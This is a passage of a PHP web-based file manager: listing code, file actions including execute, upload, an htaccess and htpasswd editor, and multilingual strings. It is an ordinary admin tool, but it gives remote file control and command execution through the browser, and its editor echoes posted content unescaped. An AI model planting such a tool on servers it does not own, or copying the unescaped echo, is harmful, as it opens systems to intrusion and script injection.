	echo '&lt;tr class="listing"&gt;
	&lt;th style="text-align: center; vertical-align: middle"&gt;&lt;img src="' . $self . '?image=smiley" alt="smiley" /&gt;&lt;/th&gt;
';

	column_title('filename', $sort, $reverse);
	column_title('size', $sort, $reverse);

	if (!$win) {
		column_title('permission', $sort, $reverse);
		column_title('owner', $sort, $reverse);
		column_title('group', $sort, $reverse);
	}

	echo '	&lt;th class="functions"&gt;' . word('functions') . '&lt;/th&gt;
&lt;/tr&gt;
';

	for ($i = 0; $i &lt; sizeof($list); $i++) {
		$file = $list[$i];

		$timestamps  = 'mtime: ' . date($date_format, $file['mtime']) . ', ';
		$timestamps .= 'atime: ' . date($date_format, $file['atime']) . ', ';
		$timestamps .= 'ctime: ' . date($date_format, $file['ctime']);

		echo '&lt;tr class="listing"&gt;
	&lt;td class="checkbox"&gt;&lt;input type="checkbox" name="checked' . $i . '" value="true" onfocus="activate(\'other\')" /&gt;&lt;/td&gt;
	&lt;td class="filename" title="' . html($timestamps) . '"&gt;';

		if ($file['is_link']) {

			echo '&lt;img src="' . $self . '?image=link" alt="link" /&gt; ';
			echo html($file['filename']) . ' &rarr; ';

			$real_file = relative2absolute($file['target'], $directory);

			if (@is_readable($real_file)) {
				if (@is_dir($real_file)) {
					echo '[ &lt;a href="' . $self . '?dir=' . urlencode($real_file) . '"&gt;' . html($file['target']) . '&lt;/a&gt; ]';
				} else {
					echo '&lt;a href="' . $self . '?action=view&amp;file=' . urlencode($real_file) . '"&gt;' . html($file['target']) . '&lt;/a&gt;';
				}
			} else {
				echo html($file['target']);
			}

		} elseif ($file['is_dir']) {

			echo '&lt;img src="' . $self . '?image=folder" alt="folder" /&gt; [ ';
			if ($win || $file['is_executable']) {
				echo '&lt;a href="' . $self . '?dir=' . urlencode($file['path']) . '"&gt;' . html($file['filename']) . '&lt;/a&gt;';
			} else {
				echo html($file['filename']);
			}
			echo ' ]';

		} else {

			if (substr($file['filename'], 0, 1) == '.') {
				echo '&lt;img src="' . $self . '?image=hidden_file" alt="hidden file" /&gt; ';
			} else {
				echo '&lt;img src="' . $self . '?image=file" alt="file" /&gt; ';
			}

			if ($file['is_file'] && $file['is_readable']) {
			   echo '&lt;a href="' . $self . '?action=view&amp;file=' . urlencode($file['path']) . '"&gt;' . html($file['filename']) . '&lt;/a&gt;';
			} else {
				echo html($file['filename']);
			}

		}

		if ($file['size'] &gt;= 1000) {
			$human = ' title="' . human_filesize($file['size']) . '"';
		} else {
			$human = '';
		}

		echo "&lt;/td&gt;\n";

		echo "\t&lt;td class=\"size\"$human&gt;{$file['size']} B&lt;/td&gt;\n";

		if (!$win) {

			echo "\t&lt;td class=\"permission\" title=\"" . decoct($file['permission']) . '"&gt;';

			$l = !$file['is_link'] && (!function_exists('posix_getuid') || $file['owner'] == posix_getuid());
			if ($l) echo '&lt;a href="' . $self . '?action=permission&amp;file=' . urlencode($file['path']) . '&amp;dir=' . urlencode($directory) . '"&gt;';
			echo html(permission_octal2string($file['permission']));
			if ($l) echo '&lt;/a&gt;';

			echo "&lt;/td&gt;\n";

			if (array_key_exists('owner_name', $file)) {
				echo "\t&lt;td class=\"owner\" title=\"uid: {$file['owner']}\"&gt;{$file['owner_name']}&lt;/td&gt;\n";
			} else {
				echo "\t&lt;td class=\"owner\"&gt;{$file['owner']}&lt;/td&gt;\n";
			}

			if (array_key_exists('group_name', $file)) {
				echo "\t&lt;td class=\"group\" title=\"gid: {$file['group']}\"&gt;{$file['group_name']}&lt;/td&gt;\n";
			} else {
				echo "\t&lt;td class=\"group\"&gt;{$file['group']}&lt;/td&gt;\n";
			}

		}

		echo '	&lt;td class="functions"&gt;
		&lt;input type="hidden" name="file' . $i . '" value="' . html($file['path']) . '" /&gt;
';

		$actions = array();
		if (function_exists('symlink')) {
			$actions[] = 'create_symlink';
		}
		if (@is_writable(dirname($file['path']))) {
			$actions[] = 'delete';
			$actions[] = 'rename';
			$actions[] = 'move';
		}
		if ($file['is_file'] && $file['is_readable']) {
			$actions[] = 'copy';
			$actions[] = 'download';
			if ($file['is_writable']) $actions[] = 'edit';
		}
		if (!$win && function_exists('exec') && $file['is_file'] && $file['is_executable'] && file_exists('/bin/sh')) {
			$actions[] = 'execute';
		}

		if (sizeof($actions) &gt; 0) {

			echo '		&lt;select class="small" name="action' . $i . '" size="1"&gt;
		&lt;option value=""&gt;' . str_repeat('&nbsp;', 30) . '&lt;/option&gt;
';

			foreach ($actions as $action) {
				echo "\t\t&lt;option value=\"$action\"&gt;" . word($action) . "&lt;/option&gt;\n";
			}

			echo '		&lt;/select&gt;
		&lt;input class="small" type="submit" name="submit' . $i . '" value=" &gt; " onfocus="activate(\'other\')" /&gt;
';

		}

		echo '	&lt;/td&gt;
&lt;/tr&gt;
';

	}

	echo '&lt;tr class="listing_footer"&gt;
	&lt;td style="text-align: right; vertical-align: top"&gt;&lt;img src="' . $self . '?image=arrow" alt="&gt;" /&gt;&lt;/td&gt;
	&lt;td colspan="' . ($cols - 1) . '"&gt;
		&lt;input type="hidden" name="num" value="' . sizeof($list) . '" /&gt;
		&lt;input type="hidden" name="focus" value="" /&gt;
		&lt;input type="hidden" name="olddir" value="' . html($directory) . '" /&gt;
';

	$actions = array();
	if (@is_writable(dirname($file['path']))) {
		$actions[] = 'delete';
		$actions[] = 'move';
	}
	$actions[] = 'copy';

	echo '		&lt;select class="small" name="action_all" size="1"&gt;
		&lt;option value=""&gt;' . str_repeat('&nbsp;', 30) . '&lt;/option&gt;
';

	foreach ($actions as $action) {
		echo "\t\t&lt;option value=\"$action\"&gt;" . word($action) . "&lt;/option&gt;\n";
	}

	echo '		&lt;/select&gt;
		&lt;input class="small" type="submit" name="submit_all" value=" &gt; " onfocus="activate(\'other\')" /&gt;
	&lt;/td&gt;
&lt;/tr&gt;
';

}

function column_title ($column, $sort, $reverse) {
	global $self, $directory;

	$d = 'dir=' . urlencode($directory) . '&amp;';

	if ($sort == $column) {
		if (!$reverse) {
			$r = '&amp;reverse=true';
			$arr = ' &and;';
		} else {
			$arr = ' &or;';
		}
	} else {
		$r = '';
	}
	echo "\t&lt;th class=\"$column\"&gt;&lt;a href=\"$self?{$d}sort=$column$r\"&gt;" . word($column) . "&lt;/a&gt;$arr&lt;/th&gt;\n";

}

function directory_choice () {
	global $directory, $homedir, $cols, $self;

	echo '&lt;tr&gt;
	&lt;td colspan="' . $cols . '" id="directory"&gt;
		&lt;a href="' . $self . '?dir=' . urlencode($homedir) . '"&gt;' . word('directory') . '&lt;/a&gt;:
		&lt;input type="text" name="dir" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" onfocus="activate(\'directory\')" /&gt;
		&lt;input type="submit" name="changedir" value="' . word('change') . '" onfocus="activate(\'directory\')" /&gt;
	&lt;/td&gt;
&lt;/tr&gt;
';

}

function upload_box () {
	global $cols;

	echo '&lt;tr&gt;
	&lt;td colspan="' . $cols . '" id="upload"&gt;
		' . word('file') . ':
		&lt;input type="file" name="upload" onfocus="activate(\'other\')" /&gt;
		&lt;input type="submit" name="submit_upload" value="' . word('upload') . '" onfocus="activate(\'other\')" /&gt;
	&lt;/td&gt;
&lt;/tr&gt;
';

}

function create_box () {
	global $cols;

	echo '&lt;tr&gt;
	&lt;td colspan="' . $cols . '" id="create"&gt;
		&lt;select name="create_type" size="1" onfocus="activate(\'create\')"&gt;
		&lt;option value="file"&gt;' . word('file') . '&lt;/option&gt;
		&lt;option value="directory"&gt;' . word('directory') . '&lt;/option&gt;
		&lt;/select&gt;
		&lt;input type="text" name="create_name" onfocus="activate(\'create\')" /&gt;
		&lt;input type="submit" name="submit_create" value="' . word('create') . '" onfocus="activate(\'create\')" /&gt;
	&lt;/td&gt;
&lt;/tr&gt;
';

}

function edit ($file) {
	global $self, $directory, $editcols, $editrows, $apache, $htpasswd, $htaccess;

	html_header();

	echo '&lt;h2 style="margin-bottom: 3pt"&gt;' . html($file) . '&lt;/h2&gt;

&lt;form action="' . $self . '" method="post"&gt;

&lt;table class="dialog"&gt;
&lt;tr&gt;
&lt;td class="dialog"&gt;

	&lt;textarea name="content" cols="' . $editcols . '" rows="' . $editrows . '" WRAP="off"&gt;';

	if (array_key_exists('content', $_POST)) {
		echo $_POST['content'];
	} else {
		$f = fopen($file, 'r');
		while (!feof($f)) {
			echo html(fread($f, 8192));
		}
		fclose($f);
	}

	if (!empty($_POST['user'])) {
		echo "\n" . $_POST['user'] . ':' . crypt($_POST['password']);
	}
	if (!empty($_POST['basic_auth'])) {
		if ($win) {
			$authfile = str_replace('\\', '/', $directory) . $htpasswd;
		} else {
			$authfile = $directory . $htpasswd;
		}
		echo "\nAuthType Basic\nAuthName &quot;Restricted Directory&quot;\n";
		echo 'AuthUserFile &quot;' . html($authfile) . "&quot;\n";
		echo 'Require valid-user';
	}

	echo '&lt;/textarea&gt;

	&lt;hr /&gt;
';

	if ($apache && basename($file) == $htpasswd) {
		echo '
	' . word('user') . ': &lt;input type="text" name="user" /&gt;
	' . word('password') . ': &lt;input type="password" name="password" /&gt;
	&lt;input type="submit" value="' . word('add') . '" /&gt;

	&lt;hr /&gt;
';

	}

	if ($apache && basename($file) == $htaccess) {
		echo '
	&lt;input type="submit" name="basic_auth" value="' . word('add_basic_auth') . '" /&gt;

	&lt;hr /&gt;
';

	}

	echo '
	&lt;input type="hidden" name="action" value="edit" /&gt;
	&lt;input type="hidden" name="file" value="' . html($file) . '" /&gt;
	&lt;input type="hidden" name="dir" value="' . html($directory) . '" /&gt;
	&lt;input type="reset" value="' . word('reset') . '" id="red_button" /&gt;
	&lt;input type="submit" name="save" value="' . word('save') . '" id="green_button" style="margin-left: 50px" /&gt;

&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;

&lt;p&gt;&lt;a href="' . $self . '?dir=' . urlencode($directory) . '"&gt;[ ' . word('back') . ' ]&lt;/a&gt;&lt;/p&gt;

&lt;/form&gt;

';

	html_footer();

}

function spacer () {
	global $cols;

	echo '&lt;tr&gt;
	&lt;td colspan="' . $cols . '" style="height: 1em"&gt;&lt;/td&gt;
&lt;/tr&gt;
';

}

function textfieldsize ($content) {

	$size = strlen($content) + 5;
	if ($size &lt; 30) $size = 30;

	return $size;

}

function request_dump () {

	foreach ($_REQUEST as $key =&gt; $value) {
		echo "\t&lt;input type=\"hidden\" name=\"" . html($key) . '" value="' . html($value) . "\" /&gt;\n";
	}

}

/* ------------------------------------------------------------------------- */

function html ($string) {
	global $site_charset;
	return htmlentities($string, ENT_COMPAT, $site_charset);
}

function word ($word) {
	global $words, $word_charset;
	return htmlentities($words[$word], ENT_COMPAT, $word_charset);
}

function phrase ($phrase, $arguments) {
	global $words;
	static $search;

	if (!is_array($search)) for ($i = 1; $i &lt;= 8; $i++) $search[] = "%$i";

	for ($i = 0; $i &lt; sizeof($arguments); $i++) {
		$arguments[$i] = nl2br(html($arguments[$i]));
	}

	$replace = array('{' =&gt; '&lt;pre&gt;', '}' =&gt;'&lt;/pre&gt;', '[' =&gt; '&lt;b&gt;', ']' =&gt; '&lt;/b&gt;');

	return str_replace($search, $arguments, str_replace(array_keys($replace), $replace, nl2br(html($words[$phrase]))));

}

function getwords ($lang) {
	global $word_charset, $date_format;

	switch ($lang) {
	case 'de':

		$date_format = 'd.m.y H:i:s';
		$word_charset = 'ISO-8859-1';

		return array(
'directory' =&gt; 'Verzeichnis',
'file' =&gt; 'Datei',
'filename' =&gt; 'Dateiname',

'size' =&gt; 'Größe',
'permission' =&gt; 'Rechte',
'owner' =&gt; 'Eigner',
'group' =&gt; 'Gruppe',
'other' =&gt; 'Andere',
'functions' =&gt; 'Funktionen',

'read' =&gt; 'lesen',
'write' =&gt; 'schreiben',
'execute' =&gt; 'ausführen',

'create_symlink' =&gt; 'Symlink erstellen',
'delete' =&gt; 'löschen',
'rename' =&gt; 'umbenennen',
'move' =&gt; 'verschieben',
'copy' =&gt; 'kopieren',
'edit' =&gt; 'editieren',
'download' =&gt; 'herunterladen',
'upload' =&gt; 'hochladen',
'create' =&gt; 'erstellen',
'change' =&gt; 'wechseln',
'save' =&gt; 'speichern',
'set' =&gt; 'setze',
'reset' =&gt; 'zurücksetzen',
'relative' =&gt; 'Pfad zum Ziel relativ',

'yes' =&gt; 'Ja',
'no' =&gt; 'Nein',
'back' =&gt; 'zurück',
'destination' =&gt; 'Ziel',
'symlink' =&gt; 'Symbolischer Link',
'no_output' =&gt; 'keine Ausgabe',

'user' =&gt; 'Benutzername',
'password' =&gt; 'Kennwort',
'add' =&gt; 'hinzufügen',
'add_basic_auth' =&gt; 'HTTP-Basic-Auth hinzufügen',

'uploaded' =&gt; '"[%1]" wurde hochgeladen.',
'not_uploaded' =&gt; '"[%1]" konnte nicht hochgeladen werden.',
'already_exists' =&gt; '"[%1]" existiert bereits.',
'created' =&gt; '"[%1]" wurde erstellt.',
'not_created' =&gt; '"[%1]" konnte nicht erstellt werden.',
'really_delete' =&gt; 'Sollen folgende Dateien wirklich gelöscht werden?',
'deleted' =&gt; "Folgende Dateien wurden gelöscht:\n[%1]",
'not_deleted' =&gt; "Folgende Dateien konnten nicht gelöscht werden:\n[%1]",
'rename_file' =&gt; 'Benenne Datei um:',
'renamed' =&gt; '"[%1]" wurde in "[%2]" umbenannt.',
'not_renamed' =&gt; '"[%1] konnte nicht in "[%2]" umbenannt werden.',
'move_files' =&gt; 'Verschieben folgende Dateien:',
'moved' =&gt; "Folgende Dateien wurden nach \"[%2]\" verschoben:\n[%1]",
'not_moved' =&gt; "Folgende Dateien konnten nicht nach \"[%2]\" verschoben werden:\n[%1]",
'copy_files' =&gt; 'Kopiere folgende Dateien:',
'copied' =&gt; "Folgende Dateien wurden nach \"[%2]\" kopiert:\n[%1]",
'not_copied' =&gt; "Folgende Dateien konnten nicht nach \"[%2]\" kopiert werden:\n[%1]",
'not_edited' =&gt; '"[%1]" kann nicht editiert werden.',
'executed' =&gt; "\"[%1]\" wurde erfolgreich ausgeführt:\n{%2}",
'not_executed' =&gt; "\"[%1]\" konnte nicht erfolgreich ausgeführt werden:\n{%2}",
'saved' =&gt; '"[%1]" wurde gespeichert.',
'not_saved' =&gt; '"[%1]" konnte nicht gespeichert werden.',
'symlinked' =&gt; 'Symbolischer Link von "[%2]" nach "[%1]" wurde erstellt.',
'not_symlinked' =&gt; 'Symbolischer Link von "[%2]" nach "[%1]" konnte nicht erstellt werden.',
'permission_for' =&gt; 'Rechte für "[%1]":',
'permission_set' =&gt; 'Die Rechte für "[%1]" wurden auf [%2] gesetzt.',
'permission_not_set' =&gt; 'Die Rechte für "[%1]" konnten nicht auf [%2] gesetzt werden.',
'not_readable' =&gt; '"[%1]" kann nicht gelesen werden.'
		);

	case 'fr':

		$date_format = 'd.m.y H:i:s';
		$word_charset = 'ISO-8859-1';

		return array(
'directory' =&gt; 'Répertoire',
'file' =&gt; 'Fichier',
'filename' =&gt; 'Nom fichier',

'size' =&gt; 'Taille',
'permission' =&gt; 'Droits',
'owner' =&gt; 'Propriétaire',
'group' =&gt; 'Groupe',
'other' =&gt; 'Autres',
'functions' =&gt; 'Fonctions',

'read' =&gt; 'Lire',
'write' =&gt; 'Ecrire',
'execute' =&gt; 'Exécuter',

'create_symlink' =&gt; 'Créer lien symbolique',
'delete' =&gt; 'Effacer',
'rename' =&gt; 'Renommer',
'move' =&gt; 'Déplacer',
'copy' =&gt; 'Copier',
'edit' =&gt; 'Ouvrir',
'download' =&gt; 'Télécharger sur PC',
'upload' =&gt; 'Télécharger sur serveur',
'create' =&gt; 'Créer',
'change' =&gt; 'Changer',
'save' =&gt; 'Sauvegarder',
'set' =&gt; 'Exécuter',
'reset' =&gt; 'Réinitialiser',
'relative' =&gt; 'Relatif',

'yes' =&gt; 'Oui',
'no' =&gt; 'Non',
'back' =&gt; 'Retour',
'destination' =&gt; 'Destination',
'symlink' =&gt; 'Lien symbollique',
'no_output' =&gt; 'Pas de sortie',

'user' =&gt; 'Utilisateur',
'password' =&gt; 'Mot de passe',
'add' =&gt; 'Ajouter',
'add_basic_auth' =&gt; 'add basic-authentification',

'uploaded' =&gt; '"[%1]" a été téléchargé sur le serveur.',
'not_uploaded' =&gt; '"[%1]" n a pas été téléchargé sur le serveur.',
'already_exists' =&gt; '"[%1]" existe déjà.',
'created' =&gt; '"[%1]" a été créé.',
'not_created' =&gt; '"[%1]" n a pas pu être créé.',
'really_delete' =&gt; 'Effacer le fichier?',
'deleted' =&gt; "Ces fichiers ont été détuits:\n[%1]",
'not_deleted' =&gt; "Ces fichiers n ont pu être détruits:\n[%1]",
'rename_file' =&gt; 'Renomme fichier:',
'renamed' =&gt; '"[%1]" a été renommé en "[%2]".',
'not_renamed' =&gt; '"[%1] n a pas pu être renommé en "[%2]".',
'move_files' =&gt; 'Déplacer ces fichiers:',
'moved' =&gt; "Ces fichiers ont été déplacés en \"[%2]\":\n[%1]",
'not_moved' =&gt; "Ces fichiers n ont pas pu être déplacés en \"[%2]\":\n[%1]",
'copy_files' =&gt; 'Copier ces fichiers:',
'copied' =&gt; "Ces fichiers ont été copiés en \"[%2]\":\n[%1]",
'not_copied' =&gt; "Ces fichiers n ont pas pu être copiés en \"[%2]\":\n[%1]",
'not_edited' =&gt; '"[%1]" ne peut être ouvert.',
'executed' =&gt; "\"[%1]\" a été brillamment exécuté :\n{%2}",
'not_executed' =&gt; "\"[%1]\" n a pas pu être exécuté:\n{%2}",
'saved' =&gt; '"[%1]" a été sauvegardé.',
'not_saved' =&gt; '"[%1]" n a pas pu être sauvegardé.',
'symlinked' =&gt; 'Un lien symbolique depuis "[%2]" vers "[%1]" a été crée.',
'not_symlinked' =&gt; 'Un lien symbolique depuis "[%2]" vers "[%1]" n a pas pu être créé.',
'permission_for' =&gt; 'Droits de "[%1]":',
'permission_set' =&gt; 'Droits de "[%1]" ont été changés en [%2].',
'permission_not_set' =&gt; 'Droits de "[%1]" n ont pas pu être changés en[%2].',
'not_readable' =&gt; '"[%1]" ne peut pas être ouvert.'
		);

	case 'it':

		$date_format = 'd-m-Y H:i:s';
		$word_charset = 'ISO-8859-1';

		return array(
'directory' =&gt; 'Directory',
'file' =&gt; 'File',
'filename' =&gt; 'Nome File',

'size' =&gt; 'Dimensioni',
'permission' =&gt; 'Permessi',
'owner' =&gt; 'Proprietario',
'group' =&gt; 'Gruppo',
'other' =&gt; 'Altro',
'functions' =&gt; 'Funzioni',

'read' =&gt; 'leggi',
'write' =&gt; 'scrivi',
'execute' =&gt; 'esegui',

'create_symlink' =&gt; 'crea link simbolico',
'delete' =&gt; 'cancella',
'rename' =&gt; 'rinomina',
'move' =&gt; 'sposta',
'copy' =&gt; 'copia',
'edit' =&gt; 'modifica',
'download' =&gt; 'download',
'upload' =&gt; 'upload',
'create' =&gt; 'crea',
'change' =&gt; 'cambia',
'save' =&gt; 'salva',
'set' =&gt; 'imposta',
'reset' =&gt; 'reimposta',
'relative' =&gt; 'Percorso relativo per la destinazione',

'yes' =&gt; 'Si',
'no' =&gt; 'No',
'back' =&gt; 'indietro',
'destination' =&gt; 'Destinazione',
'symlink' =&gt; 'Link simbolico',
'no_output' =&gt; 'no output',

'user' =&gt; 'User',
'password' =&gt; 'Password',
'add' =&gt; 'aggiungi',
'add_basic_auth' =&gt; 'aggiungi autenticazione base',

'uploaded' =&gt; '"[%1]" è stato caricato.',
'not_uploaded' =&gt; '"[%1]" non è stato caricato.',
'already_exists' =&gt; '"[%1]" esiste già.',
'created' =&gt; '"[%1]" è stato creato.',
'not_created' =&gt; '"[%1]" non è stato creato.',
'really_delete' =&gt; 'Cancello questi file ?',
'deleted' =&gt; "Questi file sono stati cancellati:\n[%1]",
'not_deleted' =&gt; "Questi file non possono essere cancellati:\n[%1]",
'rename_file' =&gt; 'File rinominato:',
'renamed' =&gt; '"[%1]" è stato rinominato in "[%2]".',
'not_renamed' =&gt; '"[%1] non è stato rinominato in "[%2]".',
'move_files' =&gt; 'Sposto questi file:',
'moved' =&gt; "Questi file sono stati spostati in \"[%2]\":\n[%1]",
'not_moved' =&gt; "Questi file non possono essere spostati in \"[%2]\":\n[%1]",
'copy_files' =&gt; 'Copio questi file',
'copied' =&gt; "Questi file sono stati copiati in \"[%2]\":\n[%1]",
'not_copied' =&gt; "Questi file non possono essere copiati in \"[%2]\":\n[%1]",
'not_edited' =&gt; '"[%1]" non può essere modificato.',
'executed' =&gt; "\"[%1]\" è stato eseguito con successo:\n{%2}",
'not_executed' =&gt; "\"[%1]\" non è stato eseguito con successo\n{%2}",
'saved' =&gt; '"[%1]" è stato salvato.',
'not_saved' =&gt; '"[%1]" non è stato salvato.',
'symlinked' =&gt; 'Il link siambolico da "[%2]" a "[%1]" è stato creato.',
'not_symlinked' =&gt; 'Il link siambolico da "[%2]" a "[%1]" non è stato creato.',
'permission_for' =&gt; 'Permessi di "[%1]":',
'permission_set' =&gt; 'I permessi di "[%1]" sono stati impostati [%2].',
'permission_not_set' =&gt; 'I permessi di "[%1]" non sono stati impostati [%2].',
'not_readable' =&gt; '"[%1]" non può essere letto.'
		);

	case 'nl':

		$date_format = 'n/j/y H:i:s';
		$word_charset = 'ISO-8859-1';

		return array(
'directory' =&gt; 'Directory',
'file' =&gt; 'Bestand',
'filename' =&gt; 'Bestandsnaam',

'size' =&gt; 'Grootte',
'permission' =&gt; 'Bevoegdheid',
'owner' =&gt; 'Eigenaar',
'group' =&gt; 'Groep',
'other' =&gt; 'Anderen',
'functions' =&gt; 'Functies',

'read' =&gt; 'lezen',
'write' =&gt; 'schrijven',
'execute' =&gt; 'uitvoeren',

'create_symlink' =&gt; 'maak symlink',
'delete' =&gt; 'verwijderen',
'rename' =&gt; 'hernoemen',
'move' =&gt; 'verplaatsen',
'copy' =&gt; 'kopieren',
'edit' =&gt; 'bewerken',
'download' =&gt; 'downloaden',
'upload' =&gt; 'uploaden',
'create' =&gt; 'aanmaken',
'change' =&gt; 'veranderen',
'save' =&gt; 'opslaan',
'set' =&gt; 'instellen',
'reset' =&gt; 'resetten',
'relative' =&gt; 'Relatief pat naar doel',

'yes' =&gt; 'Ja',
'no' =&gt; 'Nee',
'back' =&gt; 'terug',
'destination' =&gt; 'Bestemming',
'symlink' =&gt; 'Symlink',
'no_output' =&gt; 'geen output',

'user' =&gt; 'Gebruiker',
'password' =&gt; 'Wachtwoord',
'add' =&gt; 'toevoegen',
'add_basic_auth' =&gt; 'add basic-authentification',

'uploaded' =&gt; '"[%1]" is verstuurd.',
'not_uploaded' =&gt; '"[%1]" kan niet worden verstuurd.',
'already_exists' =&gt; '"[%1]" bestaat al.',
'created' =&gt; '"[%1]" is aangemaakt.',
'not_created' =&gt; '"[%1]" kan niet worden aangemaakt.',
'really_delete' =&gt; 'Deze bestanden verwijderen?',
'deleted' =&gt; "Deze bestanden zijn verwijderd:\n[%1]",
'not_deleted' =&gt; "Deze bestanden konden niet worden verwijderd:\n[%1]",
'rename_file' =&gt; 'Bestandsnaam veranderen:',
'renamed' =&gt; '"[%1]" heet nu "[%2]".',
'not_renamed' =&gt; '"[%1] kon niet worden veranderd in "[%2]".',
'move_files' =&gt; 'Verplaats deze bestanden:',
'moved' =&gt; "Deze bestanden zijn verplaatst naar \"[%2]\":\n[%1]",
'not_moved' =&gt; "Kan deze bestanden niet verplaatsen naar \"[%2]\":\n[%1]",
'copy_files' =&gt; 'Kopieer deze bestanden:',
'copied' =&gt; "Deze bestanden zijn gekopieerd naar \"[%2]\":\n[%1]",
'not_copied' =&gt; "Deze bestanden kunnen niet worden gekopieerd naar \"[%2]\":\n[%1]",
'not_edited' =&gt; '"[%1]" kan niet worden bewerkt.',
'executed' =&gt; "\"[%1]\" is met succes uitgevoerd:\n{%2}",
'not_executed' =&gt; "\"[%1]\" is niet goed uitgevoerd:\n{%2}",
'saved' =&gt; '"[%1]" is opgeslagen.',
'not_saved' =&gt; '"[%1]" is niet opgeslagen.',
'symlinked' =&gt; 'Symlink van "[%2]" naar "[%1]" is aangemaakt.',
'not_symlinked' =&gt; 'Symlink van "[%2]" naar "[%1]" is niet aangemaakt.',
'permission_for' =&gt; 'Bevoegdheid voor "[%1]":',
'permission_set' =&gt; 'Bevoegdheid van "[%1]" is ingesteld op [%2].',
'permission_not_set' =&gt; 'Bevoegdheid van "[%1]" is niet ingesteld op [%2].',
'not_readable' =&gt; '"[%1]" kan niet worden gelezen.'
		);

	case 'se':

		$date_format = 'n/j/y H:i:s';
		$word_charset = 'ISO-8859-1';
 
		return array(
'directory' =&gt; 'Mapp',
'file' =&gt; 'Fil',
'filename' =&gt; 'Filnamn',
 
'size' =&gt; 'Storlek',
'permission' =&gt; 'Säkerhetsnivå',
'owner' =&gt; 'Ägare',
'group' =&gt; 'Grupp',
'other' =&gt; 'Andra',
'functions' =&gt; 'Funktioner',
 
'read' =&gt; 'Läs',
'write' =&gt; 'Skriv',
'execute' =&gt; 'Utför',
 
'create_symlink' =&gt; 'Skapa symlink',
'delete' =&gt; 'Radera',
'rename' =&gt; 'Byt namn',
'move' =&gt; 'Flytta',
'copy' =&gt; 'Kopiera',
'edit' =&gt; 'Ändra',
'download' =&gt; 'Ladda ner',
'upload' =&gt; 'Ladda upp',
'create' =&gt; 'Skapa',
'change' =&gt; 'Ändra',
'save' =&gt; 'Spara',
'set' =&gt; 'Markera',
'reset' =&gt; 'Töm',
'relative' =&gt; 'Relative path to target',
 
'yes' =&gt; 'Ja',
'no' =&gt; 'Nej',
'back' =&gt; 'Tillbaks',
'destination' =&gt; 'Destination',
'symlink' =&gt; 'Symlink',
'no_output' =&gt; 'no output',
 
'user' =&gt; 'Användare',
'password' =&gt; 'Lösenord',
'add' =&gt; 'Lägg till',
'add_basic_auth' =&gt; 'add basic-authentification',
 
'uploaded' =&gt; '"[%1]" har laddats upp.',
'not_uploaded' =&gt; '"[%1]" kunde inte laddas upp.',
'already_exists' =&gt; '"[%1]" finns redan.',
'created' =&gt; '"[%1]" har skapats.',
'not_created' =&gt; '"[%1]" kunde inte skapas.',
'really_delete' =&gt; 'Radera dessa filer?',
'deleted' =&gt; "De här filerna har raderats:\n[%1]",
'not_deleted' =&gt; "Dessa filer kunde inte raderas:\n[%1]",
'rename_file' =&gt; 'Byt namn på fil:',
'renamed' =&gt; '"[%1]" har bytt namn till "[%2]".',
'not_renamed' =&gt; '"[%1] kunde inte döpas om till "[%2]".',
'move_files' =&gt; 'Flytta dessa filer:',
'moved' =&gt; "Dessa filer har flyttats till \"[%2]\":\n[%1]",
'not_moved' =&gt; "Dessa filer kunde inte flyttas till \"[%2]\":\n[%1]",
'copy_files' =&gt; 'Kopiera dessa filer:',
'copied' =&gt; "Dessa filer har kopierats till \"[%2]\":\n[%1]",
'not_copied' =&gt; "Dessa filer kunde inte kopieras till \"[%2]\":\n[%1]",
'not_edited' =&gt; '"[%1]" kan inte ändras.',
'executed' =&gt; "\"[%1]\" har utförts:\n{%2}",
'not_executed' =&gt; "\"[%1]\" kunde inte utföras:\n{%2}",
'saved' =&gt; '"[%1]" har sparats.',
'not_saved' =&gt; '"[%1]" kunde inte sparas.',
'symlinked' =&gt; 'Symlink från "[%2]" till "[%1]" har skapats.',
'not_symlinked' =&gt; 'Symlink från "[%2]" till "[%1]" kunde inte skapas.',
'permission_for' =&gt; 'Rättigheter för "[%1]":',
'permission_set' =&gt; 'Rättigheter för "[%1]" ändrades till [%2].',
'permission_not_set' =&gt; 'Permission of "[%1]" could not be set to [%2].',
'not_readable' =&gt; '"[%1]" kan inte läsas.'
		);

	case 'es':

		$date_format = 'j/n/y H:i:s';
		$word_charset = 'ISO-8859-1';

		return array(
'directory' =&gt; 'Directorio',
'file' =&gt; 'Archivo',
'filename' =&gt; 'Nombre Archivo',

'size' =&gt; 'Tamaño',
'permission' =&gt; 'Permisos',
'owner' =&gt; 'Propietario',
'group' =&gt; 'Grupo',
'other' =&gt; 'Otros',
'functions' =&gt; 'Funciones',

'read' =&gt; 'lectura',
'write' =&gt; 'escritura',
'execute' =&gt; 'ejecución',

'create_symlink' =&gt; 'crear enlace',
'delete' =&gt; 'borrar',
'rename' =&gt; 'renombrar',
'move' =&gt; 'mover',
'copy' =&gt; 'copiar',
'edit' =&gt; 'editar',
'download' =&gt; 'bajar',
'upload' =&gt; 'subir',
'create' =&gt; 'crear',
'change' =&gt; 'cambiar',
'save' =&gt; 'salvar',
'set' =&gt; 'setear',
'reset' =&gt; 'resetear',
'relative' =&gt; 'Path relativo',

'yes' =&gt; 'Si',
'no' =&gt; 'No',
'back' =&gt; 'atrás',
'destination' =&gt; 'Destino',
'symlink' =&gt; 'Enlace',
'no_output' =&gt; 'sin salida',

'user' =&gt; 'Usuario',
'password' =&gt; 'Clave',
'add' =&gt; 'agregar',
'add_basic_auth' =&gt; 'agregar autentificación básica',

'uploaded' =&gt; '"[%1]" ha sido subido.',
'not_uploaded' =&gt; '"[%1]" no pudo ser subido.',
'already_exists' =&gt; '"[%1]" ya existe.',
'created' =&gt; '"[%1]" ha sido creado.',
'not_created' =&gt; '"[%1]" no pudo ser creado.',
'really_delete' =&gt; '¿Borra estos archivos?',
'deleted' =&gt; "Estos archivos han sido borrados:\n[%1]",
'not_deleted' =&gt; "Estos archivos no pudieron ser borrados:\n[%1]",
'rename_file' =&gt; 'Renombra archivo:',
'renamed' =&gt; '"[%1]" ha sido renombrado a "[%2]".',
'not_renamed' =&gt; '"[%1] no pudo ser renombrado a "[%2]".',
'move_files' =&gt; 'Mover estos archivos:',
'moved' =&gt; "Estos archivos han sido movidos a \"[%2]\":\n[%1]",
'not_moved' =&gt; "Estos archivos no pudieron ser movidos a \"[%2]\":\n[%1]",
'copy_files' =&gt; 'Copiar estos archivos:',
'copied' =&gt; "Estos archivos han sido copiados a  \"[%2]\":\n[%1]",
